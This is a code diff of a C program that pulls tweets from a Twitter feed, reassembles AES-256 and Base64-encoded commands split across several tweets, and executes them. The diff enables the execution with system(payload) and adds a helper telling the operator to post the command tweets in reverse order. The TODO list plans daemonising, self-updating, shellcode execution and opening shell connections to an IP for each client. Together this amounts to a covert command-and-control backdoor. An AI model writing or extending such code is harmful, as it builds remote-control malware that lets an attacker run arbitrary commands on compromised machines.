@@ -3,35 +3,43 @@
  * http://pixelrobotics.com/2013/01/consuming-the-twitter-public-stream-with-libcurl/
  * https://curl.haxx.se/libcurl/c/getinmemory.html
  * http://stackoverflow.com/questions/21023605/initialize-array-of-strings
- * Compile with:
+ *
+ * Intersting examples:
+ * ./get -e "echo 'hello worldddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd'"
+ *
+ * Compile with: make
  *
  * "Base64 encodes each set of three bytes into four bytes. In
  * addition the output is padded to always be a multiple of four.
  *
- * gcc -g get.c base64decode.c base64encode.c -o get -lcrypto -loauth -lcurl -Og -foptimize-sibling-calls -fno-stack-protector -z execstack
+ * AES-256 is a block cipher and as such pads plaintext to block size
  *
- * @TODO: (In Progress) Pull latest tweets from a twitter feed (/) Hit
- * Twitter API (/) Store CURL results in memory (/) Use environment
- * variables for credentials (/) Copy tweets into an array in memory
- * (/) Save Base64 encoded bodies only into memory (/) Base64 decode
- * tweet (/) Encode/Decode tweet... Choose cipher AES-256 (*) Divide
- * commands longer than 140 chars over multiple tweets This has turned
- * out to be an interesting problem. If you encode everything and then
- * divide into tweets we end up with seg faults when trying to
- * decrypt. This seems to make sense as the integrity of the
- * information which is likely used in the decoding has been damaged.
- * To address this we will actually need to encrypt each tweet
- * individually on the front side. To do this, we will need to
- * pre-calc how big the encoded tweet would be and break the tweet
- * smaller if necessary
+ * @DONE:
+ * (/) Pull latest tweets from a twitter feed
+ * (/) Hit Twitter API
+ * (/) Store CURL results in memory
+ * (/) Use environment variables for credentials
+ * (/) Copy tweets into an array in memory
+ * (/) Save Base64 encoded bodies only into memory
+ * (/) Base64 decode * tweet
+ * (/) Encode/Decode tweet... Choose cipher AES-256
+ * (/) Divide commands longer than 140 chars over multiple tweets
+ * (/) Re-assemble commands longer than 140 chars from multiple tweets
+ * (/) Execute reassembled command using system
  *
- * (*) Re-assemble commands longer than 140 chars from multiple tweets
- * (*) Cast as function pointer and execute (*) Schedule on a cadence
- * (*) Run as a daemon (*) Update binary (*) Initiate shell connection
- * to IP (*) Devise way to spin off connections to each client (*)
- * Keep state of last action performed (*) Replace libcurl with pure
- * socket IO (*) Statically link liboauth (*) Replace liboauth with
- * pure c?
+ * @TODO:
+ * (*) Additional prefix pivot for system commands vs shellcode
+ * (*) Add code path to ast as function pointer and execute
+ * (*) Schedule on a cadence
+ * (*) Run as a daemon
+ * (*) Update binary
+ * (*) Initiate shell connection to IP
+ * (*) Devise way to spin off connections to each client
+ * (*) Keep state of last action performed
+ * (*) Replace libcurl with pure socket IO
+ * (*) Statically link liboauth
+ * (*) Replace liboauth with * pure c?
+ * (*) Replace openssl with a one time pade and hand rolled base64?
  **/
 
 #include <stdlib.h>
@@ -252,10 +260,12 @@ void ExecuteTweet(int tweet_index, char * cmd)
     if (found_prefix != NULL)
     {
         printf("Found prefix!\n");
-        printf("Executing: %s\n", payload);
-        //system(decryptedtext);
+        payload = payload+3; // Move past the prefix
+        printf("Executing: %s\n\n", payload);
+        system(payload);
     } else {
         printf("Prefix not found... Recurring\n");
+        printf("Command so far is %s\n", payload);
         ExecuteTweet(tweet_index+1, payload);
     }
 }
@@ -366,6 +376,15 @@ void EncodeTweets(char dest[][TWEET_LENGTH], char src[][TWEET_LENGTH], int tweet
     }
 }
 
+void PrintTweets(char encoded[][TWEET_LENGTH], int tweetCount)
+{
+    int i;
+    printf("|------ Your Tweets Are ------|\n");
+    for(i=0;i<tweetCount;i++)
+        printf("%s\n\n",encoded[i]);
+
+    printf("|------ Remember to post them in reverse order! ------|\n");
+}
 
 int main(int argc, char *argv[])
 {
@@ -388,15 +407,8 @@ int main(int argc, char *argv[])
         case 'e':
             AddPrefix(prefixed, argv[2]);
             tweetCount = DivideIntoTweets(divided, prefixed, strlen(prefixed));
-            int i;
             EncodeTweets(encoded, divided, tweetCount);
-
-            printf("|------ Your Tweets Are ------|\n");
-            for(i=0;i<tweetCount;i++)
-                printf("%s\n\n",encoded[i]);
-
-            printf("|------ Remember to post them in reverse order! ------|\n");
-
+            PrintTweets(encoded, tweetCount);
             break;
         default:
             fprintf(stderr, "Usage: %s [-loae] \n", argv[0]);
